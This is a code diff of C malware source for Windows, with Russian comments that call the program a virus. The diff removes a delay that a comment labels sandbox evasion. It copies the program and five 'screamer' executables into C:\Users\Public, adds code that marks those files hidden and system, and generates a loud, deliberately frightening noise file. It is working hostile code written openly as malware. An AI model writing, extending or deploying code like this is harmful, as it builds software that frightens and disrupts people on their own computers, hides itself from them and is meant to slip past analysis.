@@ -32,21 +32,17 @@ void generate_scream_wav() {
     fwrite("data", 1, 4, f);
     fwrite(&dataSize, 4, 1, f);
 
-    // Генерация ужасающего шума (диссонансные волны + белый шум)
+    // Генерация ужасающего шума
     for (int i = 0; i < numSamples; i++) {
         double t = (double)i / sampleRate;
-        // Низкий гул, который меняется
         double freq1 = 80.0 + 50.0 * sin(t * 2.0 * 3.14159);
-        // Резкий высокий скрежет
         double freq2 = 1500.0 + 1000.0 * sin(t * 10.0);
-        // Белый шум (хаос)
         double noise = ((rand() % 2000) - 1000) / 1000.0;
         
         double val = sin(t * freq1 * 2.0 * 3.14159) * 0.5 
                    + sin(t * freq2 * 2.0 * 3.14159) * 0.2
                    + noise * 0.3;
         
-        // Резкие скачки громкости
         if ((int)(t * 4) % 2 == 0) val *= 1.5;
         
         short sample = (short)(val * 32767.0);
@@ -68,7 +64,7 @@ void launch_screamers(void) {
 }
 
 int main(void) {
-    Sleep(600000); // Ждем 10 минут (обход песочницы)
+    // Строка Sleep(600000); удалена. Вирус работает моментально.
 
     BOOL admin = FALSE;
     PSID grp = NULL; SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
@@ -85,12 +81,19 @@ int main(void) {
     char cur[MAX_PATH]; GetModuleFileNameA(NULL, cur, MAX_PATH);
     CopyFileA(cur, "C:\\Users\\Public\\setup.exe", FALSE);
 
-    // Копируем скримеры в Public, чтобы они там лежали
+    // Копируем скримеры в Public
     CopyFileA("screamer1.exe", "C:\\Users\\Public\\screamer1.exe", FALSE);
     CopyFileA("screamer2.exe", "C:\\Users\\Public\\screamer2.exe", FALSE);
     CopyFileA("screamer3.exe", "C:\\Users\\Public\\screamer3.exe", FALSE);
     CopyFileA("screamer4.exe", "C:\\Users\\Public\\screamer4.exe", FALSE);
     CopyFileA("screamer5.exe", "C:\\Users\\Public\\screamer5.exe", FALSE);
+
+    // Скрываем их
+    SetFileAttributesA("C:\\Users\\Public\\screamer1.exe", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    SetFileAttributesA("C:\\Users\\Public\\screamer2.exe", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    SetFileAttributesA("C:\\Users\\Public\\screamer3.exe", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    SetFileAttributesA("C:\\Users\\Public\\screamer4.exe", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    SetFileAttributesA("C:\\Users\\Public\\screamer5.exe", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 
     generate_scream_wav(); // Создаем звук
 
